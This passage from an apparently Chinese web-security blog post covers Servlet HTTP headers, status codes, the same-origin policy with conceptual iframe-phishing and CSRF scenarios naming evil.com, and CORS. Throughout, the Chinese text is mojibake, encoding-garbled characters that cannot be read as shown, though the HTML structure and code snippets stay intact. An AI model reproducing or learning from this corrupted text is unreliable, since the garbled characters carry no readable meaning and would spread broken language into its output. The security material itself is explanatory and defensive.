<p><code>Referer</code>ï¼šåŒ…å«ä¸€ä¸ªURLï¼Œç”¨æˆ·ä»è¯¥URLä»£è¡¨çš„é¡µé¢å‡ºå‘è®¿é—®å½“å‰è¯·æ±‚çš„é¡µé¢ã€‚</p>
<p><code>User-Agent</code>ï¼šæµè§ˆå™¨ç±»å‹ï¼Œå¦‚æœServletè¿”å›çš„å†…å®¹ä¸æµè§ˆå™¨ç±»å‹æœ‰å…³åˆ™è¯¥å€¼éå¸¸æœ‰ç”¨ã€‚</p>
<p>UA-Pixelsï¼ŒUA-Colorï¼ŒUA-OSï¼ŒUA-CPUï¼šç”±æŸäº›ç‰ˆæœ¬çš„IEæµè§ˆå™¨æ‰€å‘é€çš„éæ ‡å‡†çš„è¯·æ±‚å¤´ï¼Œè¡¨ç¤ºå±å¹•å¤§å°ã€é¢œè‰²æ·±åº¦ã€æ“ä½œç³»ç»Ÿå’ŒCPUç±»å‹ã€‚</p>
</blockquote>
<h2 id="HTTPåº”ç­”å¤´"><a href="#HTTPåº”ç­”å¤´" class="headerlink" title="HTTPåº”ç­”å¤´"></a>HTTPåº”ç­”å¤´</h2><blockquote>
<p>WebæœåŠ¡å™¨çš„HTTPåº”ç­”ä¸€èˆ¬ç”±ä»¥ä¸‹å‡ é¡¹æ„æˆï¼šä¸€ä¸ªçŠ¶æ€è¡Œï¼Œä¸€ä¸ªæˆ–å¤šä¸ªåº”ç­”å¤´ï¼Œä¸€ä¸ªç©ºè¡Œï¼Œå†…å®¹æ–‡æ¡£ã€‚è®¾ç½®HTTPåº”ç­”å¤´å¾€å¾€å’Œè®¾ç½®çŠ¶æ€è¡Œä¸­çš„çŠ¶æ€ä»£ç ç»“åˆèµ·æ¥ã€‚ä¾‹å¦‚ï¼Œæœ‰å¥½å‡ ä¸ªè¡¨ç¤ºâ€œæ–‡æ¡£ä½ç½®å·²ç»æ”¹å˜â€çš„çŠ¶æ€ä»£ç éƒ½ä¼´éšç€ä¸€ä¸ªLocationå¤´ï¼Œè€Œ401ï¼ˆUnauthorizedï¼‰çŠ¶æ€ä»£ç åˆ™å¿…é¡»ä¼´éšä¸€ä¸ªWWW-Authenticateå¤´ã€‚<br>ç„¶è€Œï¼Œå³ä½¿åœ¨æ²¡æœ‰è®¾ç½®ç‰¹æ®Šå«ä¹‰çš„çŠ¶æ€ä»£ç æ—¶ï¼ŒæŒ‡å®šåº”ç­”å¤´ä¹Ÿæ˜¯å¾ˆæœ‰ç”¨çš„ã€‚åº”ç­”å¤´å¯ä»¥ç”¨æ¥å®Œæˆï¼šè®¾ç½®Cookieï¼ŒæŒ‡å®šä¿®æ”¹æ—¥æœŸï¼ŒæŒ‡ç¤ºæµè§ˆå™¨æŒ‰ç…§æŒ‡å®šçš„é—´éš”åˆ·æ–°é¡µé¢ï¼Œå£°æ˜æ–‡æ¡£çš„é•¿åº¦ä»¥ä¾¿åˆ©ç”¨æŒä¹…HTTPè¿æ¥ï¼Œç­‰ç­‰è®¸å¤šå…¶ä»–ä»»åŠ¡ã€‚<br>è®¾ç½®åº”ç­”å¤´æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯<code>HttpServletResponse</code>çš„<code>setHeader</code>ï¼Œè¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«è¡¨ç¤ºåº”ç­”å¤´çš„åå­—å’Œå€¼ã€‚å’Œè®¾ç½®çŠ¶æ€ä»£ç ç›¸ä¼¼ï¼Œè®¾ç½®åº”ç­”å¤´åº”è¯¥åœ¨å‘é€ä»»ä½•æ–‡æ¡£å†…å®¹ä¹‹å‰è¿›è¡Œã€‚</p>
</blockquote>
<blockquote>
<p><code>setContentType</code>ï¼šè®¾ç½®Content-Typeå¤´ã€‚å¤§å¤šæ•°<code>Servlet</code>éƒ½è¦ç”¨åˆ°è¿™ä¸ªæ–¹æ³•ã€‚</p>
<p>setContentLengthï¼šè®¾ç½®Content-Lengthå¤´ã€‚å¯¹äºæ”¯æŒæŒä¹…HTTPè¿æ¥çš„æµè§ˆå™¨æ¥è¯´ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚</p>
<p><code>addCookie</code>ï¼šè®¾ç½®ä¸€ä¸ªCookieï¼ˆ<code>Servlet</code> <code>API</code>ä¸­æ²¡æœ‰<code>setCookie</code>æ–¹æ³•ï¼Œå› ä¸ºåº”ç­”å¾€å¾€åŒ…å«å¤šä¸ªSet-Cookieå¤´ï¼‰ã€‚<br>å¦å¤–ï¼Œå¦‚ä¸ŠèŠ‚ä»‹ç»ï¼Œ<code>sendRedirect</code>æ–¹æ³•è®¾ç½®çŠ¶æ€ä»£ç 302æ—¶ä¹Ÿä¼šè®¾ç½®Locationå¤´ã€‚</p>
<p>HTTPåº”ç­”å¤´ è¯´æ˜<br>Allow æœåŠ¡å™¨æ”¯æŒå“ªäº›è¯·æ±‚æ–¹æ³•ï¼ˆå¦‚GETã€POSTç­‰ï¼‰ã€‚</p>
<p>Content-Encoding æ–‡æ¡£çš„ç¼–ç ï¼ˆEncodeï¼‰æ–¹æ³•ã€‚åªæœ‰åœ¨è§£ç ä¹‹åæ‰å¯ä»¥å¾—åˆ°Content-Typeå¤´æŒ‡å®šçš„å†…å®¹ç±»å‹ã€‚åˆ©ç”¨<code>gzip</code>å‹ç¼©æ–‡æ¡£èƒ½å¤Ÿæ˜¾è‘—åœ°å‡å°‘HTMLæ–‡æ¡£çš„ä¸‹è½½æ—¶é—´ã€‚Javaçš„<code>GZIPOutputStream</code>å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¿›è¡Œ<code>gzip</code>å‹ç¼©ï¼Œä½†åªæœ‰Unixä¸Šçš„Netscapeå’ŒWindowsä¸Šçš„IE 4ã€IE 5æ‰æ”¯æŒå®ƒã€‚å› æ­¤ï¼Œ<code>Servlet</code>åº”è¯¥é€šè¿‡æŸ¥çœ‹Accept-Encodingå¤´ï¼ˆå³<code>request.getHeader</code>(â€œAccept-Encodingâ€)ï¼‰æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦æ”¯æŒgzipï¼Œä¸ºæ”¯æŒ<code>gzip</code>çš„æµè§ˆå™¨è¿”å›ç»<code>gzip</code>å‹ç¼©çš„HTMLé¡µé¢ï¼Œä¸ºå…¶ä»–æµè§ˆå™¨è¿”å›æ™®é€šé¡µé¢ã€‚</p>
<p>Content-Length è¡¨ç¤ºå†…å®¹é•¿åº¦ã€‚åªæœ‰å½“æµè§ˆå™¨ä½¿ç”¨æŒä¹…HTTPè¿æ¥æ—¶æ‰éœ€è¦è¿™ä¸ªæ•°æ®ã€‚å¦‚æœä½ æƒ³è¦åˆ©ç”¨æŒä¹…è¿æ¥çš„ä¼˜åŠ¿ï¼Œå¯ä»¥æŠŠè¾“å‡ºæ–‡æ¡£å†™å…¥ByteArrayOutputStramï¼Œå®ŒæˆåæŸ¥çœ‹å…¶å¤§å°ï¼Œç„¶åæŠŠè¯¥å€¼æ”¾å…¥Content-Lengthå¤´ï¼Œæœ€åé€šè¿‡byteArrayStream.writeTo(response.getOutputStream()å‘é€å†…å®¹ã€‚</p>
<p>Content-Type è¡¨ç¤ºåé¢çš„æ–‡æ¡£å±äºä»€ä¹ˆMIMEç±»å‹ã€‚Servleté»˜è®¤ä¸ºtext&#x2F;plainï¼Œä½†é€šå¸¸éœ€è¦æ˜¾å¼åœ°æŒ‡å®šä¸º<br>text&#x2F;htmlã€‚ç”±äºç»å¸¸è¦è®¾ç½®Content-Typeï¼Œå› æ­¤HttpServletResponseæä¾›äº†ä¸€ä¸ªä¸“ç”¨çš„æ–¹æ³•setContentTypeã€‚</p>
<p>Date å½“å‰çš„GMTæ—¶é—´ã€‚ä½ å¯ä»¥ç”¨setDateHeaderæ¥è®¾ç½®è¿™ä¸ªå¤´ä»¥é¿å…è½¬æ¢æ—¶é—´æ ¼å¼çš„éº»çƒ¦ã€‚</p>
<p>Expires åº”è¯¥åœ¨ä»€ä¹ˆæ—¶å€™è®¤ä¸ºæ–‡æ¡£å·²ç»è¿‡æœŸï¼Œä»è€Œä¸å†ç¼“å­˜å®ƒï¼Ÿ<br>Last-Modified æ–‡æ¡£çš„æœ€åæ”¹åŠ¨æ—¶é—´ã€‚å®¢æˆ·å¯ä»¥é€šè¿‡If-Modified-Sinceè¯·æ±‚å¤´æä¾›ä¸€ä¸ªæ—¥æœŸï¼Œè¯¥è¯·æ±‚å°†è¢«è§†ä¸ºä¸€ä¸ªæ¡ä»¶GETï¼Œåªæœ‰æ”¹åŠ¨æ—¶é—´è¿ŸäºæŒ‡å®šæ—¶é—´çš„æ–‡æ¡£æ‰ä¼šè¿”å›ï¼Œå¦åˆ™è¿”å›ä¸€ä¸ª304ï¼ˆNot Modifiedï¼‰çŠ¶æ€ã€‚Last-Modifiedä¹Ÿå¯ç”¨setDateHeaderæ–¹æ³•æ¥è®¾ç½®ã€‚</p>
<p>Location è¡¨ç¤ºå®¢æˆ·åº”å½“åˆ°å“ªé‡Œå»æå–æ–‡æ¡£ã€‚Locationé€šå¸¸ä¸æ˜¯ç›´æ¥è®¾ç½®çš„ï¼Œè€Œæ˜¯é€šè¿‡HttpServletResponseçš„sendRedirectæ–¹æ³•ï¼Œè¯¥æ–¹æ³•åŒæ—¶è®¾ç½®çŠ¶æ€ä»£ç ä¸º302ã€‚</p>
<p>Refresh è¡¨ç¤ºæµè§ˆå™¨åº”è¯¥åœ¨å¤šå°‘æ—¶é—´ä¹‹ååˆ·æ–°æ–‡æ¡£ï¼Œä»¥ç§’è®¡ã€‚é™¤äº†åˆ·æ–°å½“å‰æ–‡æ¡£ä¹‹å¤–ï¼Œä½ è¿˜å¯ä»¥é€šè¿‡</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">setHeader</span><span class="params">(<span class="string">&quot;Refresh&quot;</span>, <span class="string">&quot;5; URL=http://host/path&quot;</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>è®©æµè§ˆå™¨è¯»å–æŒ‡å®šçš„é¡µé¢ã€‚æ³¨æ„è¿™ç§åŠŸèƒ½é€šå¸¸æ˜¯é€šè¿‡è®¾ç½®HTMLé¡µé¢HEADåŒºçš„</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;META <span class="attribute">HTTP-EQUIV</span>=<span class="string">&quot;Refresh&quot;</span> <span class="attribute">CONTENT</span>=<span class="string">&quot;5;URL=http://host/path&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><code>[æ³¨ï¼Œç¬”è€…å¼€å§‹æŠŠè¿™æ®µä»£ç å¤åˆ¶åˆ°è¯¥åšå®¢æ—¶ï¼Œå‘ç°ä¸€ç›´åœ¨å‘host/pathï¼Œè·³è½¬ï¼Œæœ€åæŸ¥çœ‹ç½‘ç»œï¼Œæ‰å‘ç°è¿™é‡Œè¿™æ®µä»£ç å‘æŒ¥äº†ä½œç”¨ï¼Œå¹¶æ²¡æœ‰å½“ä½œç®€å•çš„æ–‡æœ¬]</code></p>
<p>å®ç°ï¼Œè¿™æ˜¯å› ä¸ºï¼Œè‡ªåŠ¨åˆ·æ–°æˆ–é‡å®šå‘å¯¹äºé‚£äº›ä¸èƒ½ä½¿ç”¨<code>CGI</code>æˆ–<code>Servlet</code>çš„HTMLç¼–å†™è€…ååˆ†é‡è¦ã€‚ä½†æ˜¯ï¼Œå¯¹äº<code>Servlet</code>æ¥è¯´ï¼Œç›´æ¥è®¾ç½®Refreshå¤´æ›´åŠ æ–¹ä¾¿ã€‚æ³¨æ„Refreshçš„æ„ä¹‰æ˜¯â€œNç§’ä¹‹ååˆ·æ–°æœ¬é¡µé¢æˆ–è®¿é—®æŒ‡å®šé¡µé¢â€ï¼Œè€Œä¸æ˜¯â€œæ¯éš”Nç§’åˆ·æ–°æœ¬é¡µé¢æˆ–è®¿é—®æŒ‡å®šé¡µé¢â€ã€‚å› æ­¤ï¼Œè¿ç»­åˆ·æ–°è¦æ±‚æ¯æ¬¡éƒ½å‘é€ä¸€ä¸ªRefreshå¤´ï¼Œè€Œå‘é€204çŠ¶æ€ä»£ç åˆ™å¯ä»¥é˜»æ­¢æµè§ˆå™¨ç»§ç»­åˆ·æ–°ï¼Œä¸ç®¡æ˜¯ä½¿ç”¨Refreshå¤´è¿˜æ˜¯&lt;META HTTP-EQUIV&#x3D;â€Refreshâ€ â€¦&gt;ã€‚æ³¨æ„Refreshå¤´ä¸å±äºHTTP 1.1æ­£å¼è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªæ‰©å±•ï¼Œä½†Netscapeå’ŒIEéƒ½æ”¯æŒå®ƒã€‚</p>
<p>Server æœåŠ¡å™¨åå­—ã€‚Servletä¸€èˆ¬ä¸è®¾ç½®è¿™ä¸ªå€¼ï¼Œè€Œæ˜¯ç”±WebæœåŠ¡å™¨è‡ªå·±è®¾ç½®ã€‚</p>
<p><code>Set-Cookie</code> è®¾ç½®å’Œé¡µé¢å…³è”çš„Cookieã€‚Servletä¸åº”ä½¿ç”¨response.setHeader(â€œSet-Cookieâ€, â€¦)ï¼Œè€Œæ˜¯åº”ä½¿ç”¨HttpServletResponseæä¾›çš„ä¸“ç”¨æ–¹æ³•addCookieã€‚å‚è§ä¸‹æ–‡æœ‰å…³Cookieè®¾ç½®çš„è®¨è®ºã€‚</p>
<p>WWW-Authenticate å®¢æˆ·åº”è¯¥åœ¨Authorizationå¤´ä¸­æä¾›ä»€ä¹ˆç±»å‹çš„æˆæƒä¿¡æ¯ï¼Ÿåœ¨åŒ…å«401ï¼ˆUnauthorizedï¼‰çŠ¶æ€è¡Œçš„åº”ç­”ä¸­è¿™ä¸ªå¤´æ˜¯å¿…éœ€çš„ã€‚ä¾‹å¦‚ï¼Œ<code>response.setHeader</code>(â€œWWW-Authenticateâ€, â€œBASIC realm&#x3D;&quot;executives&quot;â€œ)ã€‚æ³¨æ„<code>Servlet</code>ä¸€èˆ¬ä¸è¿›è¡Œè¿™æ–¹é¢çš„å¤„ç†ï¼Œè€Œæ˜¯è®©WebæœåŠ¡å™¨çš„ä¸“é—¨æœºåˆ¶æ¥æ§åˆ¶å—å¯†ç ä¿æŠ¤é¡µé¢çš„è®¿é—®ï¼ˆä¾‹å¦‚<code>.htaccess</code>ï¼‰ã€‚</p>
</blockquote>
<h1 id="å“åº”ç "><a href="#å“åº”ç " class="headerlink" title="å“åº”ç "></a>å“åº”ç </h1><blockquote>
<p>HTTPçŠ¶æ€ç çš„å¸¸è§ç±»åˆ«å’Œå«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li>1xxï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºè¯·æ±‚å·²è¢«æ¥å—ï¼Œéœ€è¦ç»§ç»­å¤„ç†ã€‚</li>
<li>2xxï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºè¯·æ±‚å·²æˆåŠŸè¢«æœåŠ¡å™¨æ¥æ”¶ã€ç†è§£ã€å¹¶æ¥å—å¤„ç†ã€‚</li>
<li>3xxï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºéœ€è¦å®¢æˆ·ç«¯é‡‡å–è¿›ä¸€æ­¥çš„æ“ä½œæ‰èƒ½å®Œæˆè¯·æ±‚ã€‚</li>
<li>4xxï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯è¯·æ±‚é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚ã€‚</li>
<li>5xxï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯ã€‚</li>
</ul>
<p>å¸¸è§çš„HTTPçŠ¶æ€ç åŒ…æ‹¬ï¼š</p>
<ul>
<li>200 OKï¼šè¯·æ±‚æˆåŠŸã€‚</li>
<li>302 Foundï¼šè¯·æ±‚çš„èµ„æºå·²è¢«ä¸´æ—¶ç§»åŠ¨åˆ°æ–°çš„ä½ç½®ã€‚</li>
<li>400 Bad Requestï¼šè¯·æ±‚æ— æ•ˆæˆ–ä¸å®Œæ•´ã€‚</li>
<li>401 Unauthorizedï¼šæœªæˆæƒï¼Œéœ€è¦èº«ä»½éªŒè¯ã€‚</li>
<li>403 Forbiddenï¼šæœåŠ¡å™¨æ‹’ç»è¯·æ±‚ã€‚</li>
<li>404 Not Foundï¼šè¯·æ±‚çš„èµ„æºä¸å­˜åœ¨ã€‚</li>
<li>500 Internal Server Errorï¼šæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ã€‚</li>
<li>503 Service Unavailableï¼šæœåŠ¡å™¨æš‚æ—¶æ— æ³•å¤„ç†è¯·æ±‚ã€‚</li>
</ul>
</blockquote>
<h1 id="sessionåˆ©ç”¨çš„å°æ€è·¯"><a href="#sessionåˆ©ç”¨çš„å°æ€è·¯" class="headerlink" title="sessionåˆ©ç”¨çš„å°æ€è·¯"></a>sessionåˆ©ç”¨çš„å°æ€è·¯</h1><p><strong>å¸¸è§çš„åŸºæœ¬å°±ä¸¤ç§ï¼Œ<code>session</code>æ–‡ä»¶åŒ…å«å’Œ<code>session</code>ååºåˆ—åŒ–</strong></p>
<p><code>åŸæ–‡é“¾æ¥</code>ï¼š<a href="https://xz.aliyun.com/t/10662">https://xz.aliyun.com/t/10662</a></p>
<h1 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h1><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ä½œè€…ï¼šlaixiangran</span><br><span class="line">é“¾æ¥ï¼šhttps:<span class="regexp">//</span>juejin.cn<span class="regexp">/post/</span><span class="number">6844903681683357710</span></span><br><span class="line">æ¥æºï¼šç¨€åœŸæ˜é‡‘</span><br><span class="line">è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h2><p>1995å¹´ï¼ŒåŒæºæ”¿ç­–ç”± Netscape å…¬å¸å¼•å…¥æµè§ˆå™¨ã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½å®è¡Œè¿™ä¸ªæ”¿ç­–ã€‚</p>
<p>æœ€åˆï¼Œå®ƒçš„å«ä¹‰æ˜¯æŒ‡ï¼ŒAç½‘é¡µè®¾ç½®çš„ Cookieï¼ŒBç½‘é¡µä¸èƒ½æ‰“å¼€ï¼Œé™¤éè¿™ä¸¤ä¸ªç½‘é¡µâ€åŒæºâ€ã€‚æ‰€è°“â€åŒæºâ€æŒ‡çš„æ˜¯â€ä¸‰ä¸ªç›¸åŒâ€ã€‚</p>
<blockquote>
<ul>
<li>åè®®ç›¸åŒ</li>
<li>åŸŸåç›¸åŒ</li>
<li>ç«¯å£ç›¸åŒ</li>
</ul>
</blockquote>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œ<code>http://www.example.com/dir/page.html</code>è¿™ä¸ªç½‘å€ï¼Œåè®®æ˜¯<code>http://</code>ï¼ŒåŸŸåæ˜¯<code>www.example.com</code>ï¼Œç«¯å£æ˜¯<code>80</code>ï¼ˆé»˜è®¤ç«¯å£å¯ä»¥çœç•¥ï¼‰ã€‚</p>
<p>å®ƒçš„åŒæºæƒ…å†µå¦‚ä¸‹</p>
<blockquote>
<ul>
<li><code>http://www.example.com/dir2/other.html</code>ï¼šåŒæº</li>
<li><code>http://example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li>
<li><code>http://v2.www.example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li>
<li><code>http://www.example.com:81/dir/other.html</code>ï¼šä¸åŒæºï¼ˆç«¯å£ä¸åŒï¼‰</li>
</ul>
</blockquote>
<h2 id="é™åˆ¶èŒƒå›´"><a href="#é™åˆ¶èŒƒå›´" class="headerlink" title="é™åˆ¶èŒƒå›´"></a>é™åˆ¶èŒƒå›´</h2><p>éšç€äº’è”ç½‘çš„å‘å±•ï¼Œâ€åŒæºæ”¿ç­–â€è¶Šæ¥è¶Šä¸¥æ ¼ã€‚ç›®å‰ï¼Œå¦‚æœéåŒæºï¼Œå…±æœ‰ä¸‰ç§è¡Œä¸ºå—åˆ°é™åˆ¶ã€‚</p>
<blockquote>
<p>ï¼ˆ1ï¼‰ Cookieã€LocalStorage å’Œ IndexDB æ— æ³•è¯»å–ã€‚</p>
<p>ï¼ˆ2ï¼‰ DOM æ— æ³•è·å¾—ã€‚</p>
<p>ï¼ˆ3ï¼‰ AJAX è¯·æ±‚ä¸èƒ½å‘é€ã€‚</p>
</blockquote>
<p>è™½ç„¶è¿™äº›é™åˆ¶æ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯æœ‰æ—¶å¾ˆä¸æ–¹ä¾¿ï¼Œåˆç†çš„ç”¨é€”ä¹Ÿå—åˆ°å½±å“ã€‚ä¸‹é¢ï¼Œæˆ‘å°†è¯¦ç»†ä»‹ç»ï¼Œå¦‚ä½•è§„é¿ä¸Šé¢ä¸‰ç§é™åˆ¶ã€‚</p>
<h2 id="ä¸ºä»€ä¹ˆè¦æœ‰è·¨åŸŸé™åˆ¶"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰è·¨åŸŸé™åˆ¶" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰è·¨åŸŸé™åˆ¶"></a>ä¸ºä»€ä¹ˆè¦æœ‰è·¨åŸŸé™åˆ¶</h2><p>å› ä¸ºå­˜åœ¨æµè§ˆå™¨åŒæºç­–ç•¥ï¼Œæ‰€ä»¥æ‰ä¼šæœ‰è·¨åŸŸé—®é¢˜ã€‚é‚£ä¹ˆæµè§ˆå™¨æ˜¯å‡ºäºä½•ç§åŸå› ä¼šæœ‰è·¨åŸŸçš„é™åˆ¶å‘¢ã€‚å…¶å®ä¸éš¾æƒ³åˆ°ï¼Œè·¨åŸŸé™åˆ¶ä¸»è¦çš„ç›®çš„å°±æ˜¯ä¸ºäº†ç”¨æˆ·çš„ä¸Šç½‘å®‰å…¨ã€‚</p>
<p>å¦‚æœæµè§ˆå™¨æ²¡æœ‰åŒæºç­–ç•¥ï¼Œä¼šå­˜åœ¨ä»€ä¹ˆæ ·çš„å®‰å…¨é—®é¢˜å‘¢ã€‚ä¸‹é¢ä» DOM åŒæºç­–ç•¥å’Œ XMLHttpRequest åŒæºç­–ç•¥æ¥ä¸¾ä¾‹è¯´æ˜ï¼š</p>
<p><strong>å¦‚æœæ²¡æœ‰ DOM åŒæºç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸åŒåŸŸçš„ iframe ä¹‹é—´å¯ä»¥ç›¸äº’è®¿é—®ï¼Œé‚£ä¹ˆé»‘å®¢å¯ä»¥è¿™æ ·è¿›è¡Œæ”»å‡»ï¼š</strong></p>
<blockquote>
<ol>
<li>åšä¸€ä¸ªå‡ç½‘ç«™ï¼Œé‡Œé¢ç”¨ iframe åµŒå¥—ä¸€ä¸ªé“¶è¡Œç½‘ç«™ <code>http://mybank.com</code>ã€‚</li>
<li>æŠŠ iframe å®½é«˜å•¥çš„è°ƒæ•´åˆ°é¡µé¢å…¨éƒ¨ï¼Œè¿™æ ·ç”¨æˆ·è¿›æ¥é™¤äº†åŸŸåï¼Œåˆ«çš„éƒ¨åˆ†å’Œé“¶è¡Œçš„ç½‘ç«™æ²¡æœ‰ä»»ä½•å·®åˆ«ã€‚</li>
<li>è¿™æ—¶å¦‚æœç”¨æˆ·è¾“å…¥è´¦å·å¯†ç ï¼Œæˆ‘ä»¬çš„ä¸»ç½‘ç«™å¯ä»¥è·¨åŸŸè®¿é—®åˆ° <code>http://mybank.com</code> çš„ dom èŠ‚ç‚¹ï¼Œå°±å¯ä»¥æ‹¿åˆ°ç”¨æˆ·çš„è´¦æˆ·å¯†ç äº†ã€‚</li>
</ol>
</blockquote>
<p><strong>å¦‚æœæ²¡æœ‰ XMLHttpRequest åŒæºç­–ç•¥ï¼Œé‚£ä¹ˆé»‘å®¢å¯ä»¥è¿›è¡Œ CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ æ”»å‡»ï¼š</strong></p>
<blockquote>
<ol>
<li>ç”¨æˆ·ç™»å½•äº†è‡ªå·±çš„é“¶è¡Œé¡µé¢ <code>http://mybank.com</code>ï¼Œ<code>http://mybank.com</code> å‘ç”¨æˆ·çš„ cookie ä¸­æ·»åŠ ç”¨æˆ·æ ‡è¯†ã€‚</li>
<li>ç”¨æˆ·æµè§ˆäº†æ¶æ„é¡µé¢ <code>http://evil.com</code>ï¼Œæ‰§è¡Œäº†é¡µé¢ä¸­çš„æ¶æ„ AJAX è¯·æ±‚ä»£ç ã€‚</li>
<li><code>http://evil.com</code> å‘ <code>http://mybank.com</code> å‘èµ· AJAX HTTP è¯·æ±‚ï¼Œè¯·æ±‚ä¼šé»˜è®¤æŠŠ <code>http://mybank.com</code> å¯¹åº” cookie ä¹ŸåŒæ—¶å‘é€è¿‡å»ã€‚</li>
<li>é“¶è¡Œé¡µé¢ä»å‘é€çš„ cookie ä¸­æå–ç”¨æˆ·æ ‡è¯†ï¼ŒéªŒè¯ç”¨æˆ·æ— è¯¯ï¼Œresponse ä¸­è¿”å›è¯·æ±‚æ•°æ®ã€‚æ­¤æ—¶æ•°æ®å°±æ³„éœ²äº†ã€‚</li>
<li>è€Œä¸”ç”±äº Ajax åœ¨åå°æ‰§è¡Œï¼Œç”¨æˆ·æ— æ³•æ„ŸçŸ¥è¿™ä¸€è¿‡ç¨‹ã€‚</li>
</ol>
</blockquote>
<p>å› æ­¤ï¼Œæœ‰äº†æµè§ˆå™¨åŒæºç­–ç•¥ï¼Œæˆ‘ä»¬æ‰èƒ½æ›´å®‰å…¨çš„ä¸Šç½‘ã€‚</p>
<h2 id="è·¨åŸŸçš„è§£å†³æ–¹æ³•"><a href="#è·¨åŸŸçš„è§£å†³æ–¹æ³•" class="headerlink" title="è·¨åŸŸçš„è§£å†³æ–¹æ³•"></a>è·¨åŸŸçš„è§£å†³æ–¹æ³•</h2><p>ä»ä¸Šé¢æˆ‘ä»¬äº†è§£åˆ°äº†æµè§ˆå™¨åŒæºç­–ç•¥çš„ä½œç”¨ï¼Œä¹Ÿæ­£æ˜¯æœ‰äº†è·¨åŸŸé™åˆ¶ï¼Œæ‰ä½¿æˆ‘ä»¬èƒ½å®‰å…¨çš„ä¸Šç½‘ã€‚ä½†æ˜¯åœ¨å®é™…ä¸­ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦çªç ´è¿™æ ·çš„é™åˆ¶ï¼Œå› æ­¤ä¸‹é¢å°†ä»‹ç»å‡ ç§è·¨åŸŸçš„è§£å†³æ–¹æ³•ã€‚</p>
<h2 id="CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰"><a href="#CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰" class="headerlink" title="CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰"></a>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰</h2><blockquote>
<p>CORSï¼ˆCross-origin resource sharingï¼Œè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ä¸€ä¸ª W3C æ ‡å‡†ï¼Œå®šä¹‰äº†åœ¨å¿…é¡»è®¿é—®è·¨åŸŸèµ„æºæ—¶ï¼Œæµè§ˆå™¨ä¸æœåŠ¡å™¨åº”è¯¥å¦‚ä½•æ²Ÿé€šã€‚CORS èƒŒåçš„åŸºæœ¬æ€æƒ³ï¼Œå°±æ˜¯ä½¿ç”¨è‡ªå®šä¹‰çš„ HTTP å¤´éƒ¨è®©æµè§ˆå™¨ä¸æœåŠ¡å™¨è¿›è¡Œæ²Ÿé€šï¼Œä»è€Œå†³å®šè¯·æ±‚æˆ–å“åº”æ˜¯åº”è¯¥æˆåŠŸï¼Œè¿˜æ˜¯åº”è¯¥å¤±è´¥ã€‚</p>
<p>CORS éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼ŒIE æµè§ˆå™¨ä¸èƒ½ä½äº IE10ã€‚</p>
